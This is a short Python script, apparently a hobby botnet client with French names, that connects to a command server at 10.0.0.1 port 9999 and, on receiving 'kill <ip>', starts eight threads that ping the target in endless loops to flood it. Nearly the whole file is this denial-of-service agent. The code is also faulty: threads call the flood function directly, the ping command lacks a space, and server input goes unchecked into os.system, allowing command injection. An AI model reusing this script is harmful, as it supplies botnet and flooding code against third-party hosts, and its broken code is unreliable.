import socket
import threading
import os
import smtplib
from email.message import EmailMessage

serveur_ip = "10.0.0.1"
serveur_port = 9999

def thread_recevoir(client_socket):
    while True:
        response = client.recv(1024)
        print(response)
        kill = response.split()
        if kill[0] == "kill":
            thread_ddos = threading.Thread(target=thread_envoyer_ping(kill[1]))
            thread_ddos.start()
            thread_ddos2 = threading.Thread(target=thread_envoyer_ping(kill[1]))
            thread_ddos2.start()
            thread_ddos3= threading.Thread(target=thread_envoyer_ping(kill[1]))
            thread_ddos3.start()
            thread_ddos4 = threading.Thread(target=thread_envoyer_ping(kill[1]))
            thread_ddos4.start()
            thread_ddos5 = threading.Thread(target=thread_envoyer_ping(kill[1]))
            thread_ddos5.start()
            thread_ddos6 = threading.Thread(target=thread_envoyer_ping(kill[1]))
            thread_ddos6.start()
            thread_ddos7 = threading.Thread(target=thread_envoyer_ping(kill[1]))
            thread_ddos7.start()
            thread_ddos8 = threading.Thread(target=thread_envoyer_ping(kill[1]))
            thread_ddos8.start()

def thread_envoyer_ping(ip):
    while True:
        os.system("ping" + ip)

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client.connect((serveur_ip, serveur_port))

thread_recevoir = threading.Thread(target=thread_recevoir, args={client, })
thread_recevoir.start()


while True:
    texte = input()
    client.send(str.encode(texte))